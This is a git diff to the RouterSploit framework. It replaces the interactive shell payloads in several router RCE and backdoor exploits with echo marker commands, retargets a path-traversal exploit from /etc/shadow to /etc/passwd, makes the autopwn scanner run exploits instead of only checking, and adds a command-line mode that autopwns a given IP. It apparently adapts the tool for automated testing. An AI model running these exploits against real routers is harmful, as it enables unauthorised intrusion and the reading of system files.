+diff --git a/routersploit/modules/exploits/routers/netsys/multi_rce.py b/routersploit/modules/exploits/routers/netsys/multi_rce.py
+index 8e56e6d..3c0af51 100644
+--- a/routersploit/modules/exploits/routers/netsys/multi_rce.py
++++ b/routersploit/modules/exploits/routers/netsys/multi_rce.py
+@@ -36,7 +36,8 @@ class Exploit(HTTPClient):
+         if self.check():
+             print_success("Target seems to be vulnerable")
+             print_status("Invoking command loop...")
+-            shell(self, architecture="mipsle")
++            self.execute("echo b33f39")
++            #shell(self, architecture="mipsle")
+         else:
+             print_error("Exploit failed - target seems to be not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/tplink/archer_c2_c20i_rce.py b/routersploit/modules/exploits/routers/tplink/archer_c2_c20i_rce.py
+index dec1f06..baa1092 100644
+--- a/routersploit/modules/exploits/routers/tplink/archer_c2_c20i_rce.py
++++ b/routersploit/modules/exploits/routers/tplink/archer_c2_c20i_rce.py
+@@ -29,9 +29,10 @@ class Exploit(HTTPClient):
+             print_success("Target is vulnerable")
+             print_status("Invoking command shell")
+             print_status("It is blind command injection so response is not available")
++            self.execute("echo%20b33f40")
+ 
+             # requires testing
+-            shell(self, architecture="mipsbe", method="wget", location="/tmp")
++            #shell(self, architecture="mipsbe", method="wget", location="/tmp")
+         else:
+             print_error("Exploit failed - target seems to be not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/tplink/wdr740nd_wdr740n_backdoor.py b/routersploit/modules/exploits/routers/tplink/wdr740nd_wdr740n_backdoor.py
+index aa3d3e3..7422f8f 100644
+--- a/routersploit/modules/exploits/routers/tplink/wdr740nd_wdr740n_backdoor.py
++++ b/routersploit/modules/exploits/routers/tplink/wdr740nd_wdr740n_backdoor.py
+@@ -32,7 +32,8 @@ class Exploit(HTTPClient):
+         if self.check():
+             print_success("Target is vulnerable")
+             print_status("Invoking command shell")
+-            shell(self)
++            self.execute("echo%20b33f41")
++            #shell(self)
+         else:
+             print_error("Exploit failed - target seems to be not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/tplink/wdr740nd_wdr740n_path_traversal.py b/routersploit/modules/exploits/routers/tplink/wdr740nd_wdr740n_path_traversal.py
+index 6aa49d2..507b67e 100644
+--- a/routersploit/modules/exploits/routers/tplink/wdr740nd_wdr740n_path_traversal.py
++++ b/routersploit/modules/exploits/routers/tplink/wdr740nd_wdr740n_path_traversal.py
+@@ -23,7 +23,7 @@ class Exploit(HTTPClient):
+     target = OptIP("", "Target IPv4 or IPv6 address")
+     port = OptPort(80, "Target HTTP port")
+ 
+-    filename = OptString("/etc/shadow", "File to read from the filesystem")
++    filename = OptString("/etc/passwd", "File to read from the filesystem")
+ 
+     def run(self):
+         if self.check():
+@@ -53,7 +53,7 @@ class Exploit(HTTPClient):
+ 
+     @mute
+     def check(self):
+-        path = "/help/../../../../../../../../../../../../../../../../etc/shadow"
++        path = "/help/../../../../../../../../../../../../../../../../etc/passwd"
+ 
+         response = self.http_request(
+             method="GET",
+@@ -62,7 +62,7 @@ class Exploit(HTTPClient):
+         if response is None:
+             return False  # target is not vulnerable
+ 
+-        if utils.detect_file_content(response.text, "/etc/shadow"):
++        if utils.detect_file_content(response.text, "/etc/passwd"):
+             return True  # target is vulnerable
+ 
+         return False  # target is not vulnerable
+diff --git a/routersploit/modules/exploits/routers/zte/f460_f660_backdoor.py b/routersploit/modules/exploits/routers/zte/f460_f660_backdoor.py
+index 3b19744..35c5485 100644
+--- a/routersploit/modules/exploits/routers/zte/f460_f660_backdoor.py
++++ b/routersploit/modules/exploits/routers/zte/f460_f660_backdoor.py
+@@ -28,7 +28,8 @@ class Exploit(HTTPClient):
+         if self.check():
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop")
+-            shell(self)
++            self.execute("echo b33f42")
++            #shell(self)
+         else:
+             print_error("Exploit failed - target seems to be not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/zte/zxv10_rce.py b/routersploit/modules/exploits/routers/zte/zxv10_rce.py
+index 1ce845a..c6bcfc5 100644
+--- a/routersploit/modules/exploits/routers/zte/zxv10_rce.py
++++ b/routersploit/modules/exploits/routers/zte/zxv10_rce.py
+@@ -37,7 +37,8 @@ class Exploit(HTTPClient):
+             self.info()
+ 
+             print_status("Invoking command loop")
+-            shell(self, architecture="mipsbe", method="wget", location="/tmp")
++            self.execute("echo b33f43")
++            #shell(self, architecture="mipsbe", method="wget", location="/tmp")
+         else:
+             print_error("Exploit failed - target seems to be not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/zyxel/d1000_rce.py b/routersploit/modules/exploits/routers/zyxel/d1000_rce.py
+index d7cc4e8..719a110 100644
+--- a/routersploit/modules/exploits/routers/zyxel/d1000_rce.py
++++ b/routersploit/modules/exploits/routers/zyxel/d1000_rce.py
+@@ -29,7 +29,8 @@ class Exploit(HTTPClient):
+             print_success("Target appears to be vulnerable")
+             print_status("Invoking command loop...")
+             print_status("It is blind command injection - response is not available")
+-            shell(self, architecture="mipsbe")
++            self.execute("echo b33f44")
++            #shell(self, architecture="mipsbe")
+         else:
+             print_error("Target seems to be not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/zyxel/p660hn_t_v1_rce.py b/routersploit/modules/exploits/routers/zyxel/p660hn_t_v1_rce.py
+index a9b4577..713ff77 100644
+--- a/routersploit/modules/exploits/routers/zyxel/p660hn_t_v1_rce.py
++++ b/routersploit/modules/exploits/routers/zyxel/p660hn_t_v1_rce.py
+@@ -29,7 +29,8 @@ class Exploit(HTTPClient):
+             print_success("Target appears to be vulnerable")
+             print_status("Invoking command loop...")
+             print_status("It is blind command injection - response is not available")
+-            shell(self, architecture="mipsbe")
++            self.execute("echo b33f45")
++            #shell(self, architecture="mipsbe")
+         else:
+             print_error("Target seems to be not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/zyxel/p660hn_t_v2_rce.py b/routersploit/modules/exploits/routers/zyxel/p660hn_t_v2_rce.py
+index 57befff..b0bc9fc 100644
+--- a/routersploit/modules/exploits/routers/zyxel/p660hn_t_v2_rce.py
++++ b/routersploit/modules/exploits/routers/zyxel/p660hn_t_v2_rce.py
+@@ -36,7 +36,8 @@ class Exploit(HTTPClient):
+             print_success("Target appears to be vulnerable")
+             print_status("Invoking command loop...")
+             print_status("It is blind command injection - response is not available. Command length up to 28 characters.")
+-            shell(self, architecture="mipsbe")
++            self.execute("echo b33f46")
++            #shell(self, architecture="mipsbe")
+         else:
+             print_error("Target seems to be not vulnerable")
+ 
+diff --git a/routersploit/modules/scanners/autopwn.py b/routersploit/modules/scanners/autopwn.py
+index 4fe9a88..a4a95de 100644
+--- a/routersploit/modules/scanners/autopwn.py
++++ b/routersploit/modules/scanners/autopwn.py
+@@ -169,7 +169,7 @@ class Exploit(Exploit):
+         #        elif exploit.target_protocol not in ["tcp", "udp"]:
+         #            exploit.target_protocol = "custom"
+ 
+-                response = exploit.check()
++                response = exploit.run()
+ 
+                 if response is True:
+                     print_info("\033[92m[+]\033[0m", "{}:{} {} {} is vulnerable".format(
+diff --git a/rsf.py b/rsf.py
+index 61664a7..166ca1a 100755
+--- a/rsf.py
++++ b/rsf.py
+@@ -17,15 +17,28 @@ LOGGER.setLevel(logging.DEBUG)
+ LOGGER.addHandler(log_handler)
+ 
+ 
+-def routersploit(argv):
++def routersploit(target_ip = None, exploit = None, cmd = None):
+     rsf = RoutersploitInterpreter()
+-    if len(argv[1:]):
+-        rsf.nonInteractive(argv)
+-    else:
++    if not target_ip:
+         rsf.start()
++    elif exploit:
++        rsf.run_command('use {}'.format(exploit))
++        rsf.run_command('set target %s' % target_ip)
++        rsf.run_command('run')
++    else:
++        rsf.run_command('use scanners/autopwn')
++        rsf.run_command('set check_creds false')
++        rsf.run_command('set threads 1')
++        rsf.run_command('set target %s' % target_ip)
++        rsf.run_command('run')
+ 
+ if __name__ == "__main__":
+     try:
+-        routersploit(sys.argv)
++        if len(sys.argv) == 2:
++            routersploit(sys.argv[1])
++        elif len(sys.argv) == 3:
++            routersploit(sys.argv[1], sys.argv[2])
++        else:
++            routersploit()
+     except (KeyboardInterrupt, SystemExit):
+         pass
